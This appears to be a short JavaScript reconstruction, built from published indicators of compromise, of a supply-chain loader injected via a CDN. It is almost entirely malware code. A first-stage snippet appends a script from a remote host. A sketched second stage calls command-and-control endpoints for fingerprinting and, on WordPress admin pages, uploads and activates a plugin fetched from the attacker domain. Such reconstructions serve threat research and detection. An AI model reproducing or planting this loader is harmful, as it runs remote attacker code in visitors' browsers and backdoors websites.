// reconstructed from public Sansec IOCs — Brevo CDN-edge injected loader
(function () {
  var s = document.createElement("script");
  s.src = "https://cdn2.sendibt1.com/f.js";
  s.async = true;
  var h = document.head || document.documentElement;
  h.appendChild(s);
})();
// second stage f.js behaviour (reconstructed): fingerprint + ClickFix + WP admin drop
var C2 = "https://cdn9.sendibt1.com";
fetch(C2 + "/api/v1/0044d4a");            // fingerprint
fetch(C2 + "/api/v1/e08a3c4");            // proof-of-work
if (document.body.className.indexOf("wp-admin") !== -1 || window.isAdmin) {
  var form = "/wp-admin/update.php?action=upload-plugin";
  uploadPlugin(form, "https://cdn10.sendibt1.com/p/wm.zip");
  activate("/wp-admin/plugins.php?action=activate");
}
